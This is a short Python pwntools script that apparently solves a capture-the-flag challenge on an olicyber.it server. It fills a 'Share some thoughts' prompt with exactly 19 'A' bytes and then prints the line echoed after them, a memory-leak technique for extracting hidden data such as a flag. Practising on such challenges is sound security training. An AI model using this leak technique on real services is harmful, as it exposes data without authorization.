from pwn import *

r = remote('thewall.challs.olicyber.it', 21007)

r.recvuntil(b'Choose an option: ')
r.sendline(b'1')
r.recvuntil(b'Share some thoughts: ')
r.sendline(b'A' * 19)
r.recvuntil(b'Choose an option: ')
r.sendline(b'2')

r.recvuntil(b'A'*19 + b'\n')
print(r.recvline().decode())

r.close()